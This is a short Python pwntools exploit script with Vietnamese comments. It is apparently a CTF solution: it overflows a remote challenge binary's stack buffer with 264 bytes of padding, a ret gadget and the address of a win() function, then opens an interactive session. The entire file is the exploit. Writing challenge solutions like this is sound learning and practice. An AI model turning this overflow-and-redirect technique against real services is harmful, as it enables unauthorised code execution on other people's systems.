from pwn import *

# Kết nối tới server
p = remote('amt.rs', 30382)

# Địa chỉ của hàm win()
win_addr = 0x401176

# Địa chỉ của ret gadget bạn vừa tìm được
ret_gadget = 0x40101a

# Offset không đổi
offset = 264

# Xây dựng payload MỚI
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)

# Gửi độ dài của payload
p.sendlineafter(b'how much would you like to write? ', str(len(payload)).encode())

p.sendline(payload)

p.interactive()